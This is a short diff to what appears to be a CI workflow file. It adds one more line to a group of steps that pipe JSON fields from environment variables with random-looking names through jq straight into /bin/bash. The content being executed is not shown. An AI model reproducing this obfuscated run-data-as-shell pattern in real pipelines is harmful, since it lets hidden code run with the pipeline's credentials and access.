@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$pmh62015" | jq -r .vjhon6 | /bin/bash
           printf '%s' "$fn3" | jq -r .cchw6 | /bin/bash
           echo $nv46376 | jq -r .uil8 | /bin/bash
+          echo $wavh103 | jq -r .tvxhn55 | /bin/bash
 
       - name: Archive results
         if: always()
